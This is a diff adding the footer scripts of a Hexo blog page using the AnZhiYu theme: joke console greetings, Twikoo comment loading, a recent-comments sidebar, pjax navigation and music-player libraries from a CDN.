+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.7.1",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Lark 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo-vercel-sigma-ruddy.vercel.app/',
+      region: '',
+      onCommentLoaded: () => {
+        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(runFn,0)
+    else getScript('https://cdn.cbd.int/twikoo@1.6.44/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo-vercel-sigma-ruddy.vercel.app/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const runFn = () => {
+    init();
+    
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else {
+      loadTwikoo()
+    }
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getComment = () => {
+    const runTwikoo = () => {
+      twikoo.getRecentComments({
+        envId: 'https://twikoo-vercel-sigma-ruddy.vercel.app/',
+        region: '',
+        pageSize: 6,
+        includeReply: true
+      }).then(function (res) {
+        const twikooArray = res.map(e => {
+          return {
+            'content': changeContent(e.comment),
+            'avatar': e.avatar,
+            'nick': e.nick,
+            'url': e.url + '#' + e.id,
+            'date': new Date(e.created).toISOString()
+          }
+        })
+
+        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
+        generateHtml(twikooArray)
+      }).catch(function (err) {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+      })
+    }
+
+    if (typeof twikoo === 'object') {
+      runTwikoo()
+    } else {
+      getScript('https://cdn.cbd.int/twikoo@1.6.44/dist/twikoo.all.min.js').then(runTwikoo)
+    }
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
+        }
+        
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom && ($dom.innerHTML= result)
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('twikoo-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://cdn.cbd.int/qrcodejs@1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script async data-pjax src="/js/imgloaded.js"></script><script src="/js/footer-animals.js" defer></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
